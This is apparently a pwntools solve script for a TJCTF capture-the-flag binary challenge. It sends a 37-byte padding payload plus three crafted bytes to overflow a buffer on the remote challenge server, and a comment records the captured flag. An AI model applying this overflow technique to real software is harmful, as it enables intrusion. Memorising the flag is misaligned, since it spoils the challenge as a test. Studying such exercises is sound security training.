from pwn import *
context.clear(arch='amd64')
elf = ELF('./chall')

# p = process('./chall')
p = remote('tjc.tf',31453)
p.recvuntil(b"what's your favorite color's rgb value? (format: r, g, b)\n")

p.send(b'50, 84, 52\n')
payload = b'A' * 37

payload += p8(52)
payload += p8(84)
payload += p8(50)

p.recvuntil(b"good... good... and its pretty name?\n")
p.send(payload)

# tjctf{i_l1k3_gr3y_a_l0t_f49ad3}
p.interactive()
